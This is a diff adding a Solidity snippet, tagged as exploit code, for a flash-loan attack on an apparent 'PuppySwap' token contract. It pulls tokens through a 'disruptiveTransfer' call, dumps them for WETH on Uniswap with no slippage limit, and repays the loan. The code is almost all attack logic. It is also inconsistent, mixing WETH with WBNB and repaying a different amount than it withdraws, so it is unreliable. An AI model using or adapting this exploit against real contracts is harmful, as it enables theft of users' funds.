@@ -1,0 +1,34 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Obtain tokens from the target contract using a disruptive transfer
+    IPuppySwapToken(target).disruptiveTransfer(address(this), amount);
+
+    uint256 puppyBalance = valuableToken.balanceOf(address(this));
+    console.log("Puppy balance after disrupting transfer: %s", puppyBalance);
+
+    // Approve the target to spend our tokens
+    valuableToken.approve(address(uniswapRouter), puppyBalance);
+    
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken); // token to swap
+    path[1] = uniswapRouter.WETH(); // target token is WETH
+
+    // Swap Puppy's for WETH
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        puppyBalance,
+        0, // accept any amount of WETH
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    uint256 wbnbBalance = address(this).balance;
+    console.log("WBNB balance after swapping puppies: %s", wbnbBalance);
+    
+    // Repay the flash loan
+    IWETH(wbnbToken).withdraw(wbnbBalance);
+    payable(flashloanProvider).transfer(amount);
+}
+</executeExploitCode>
+```
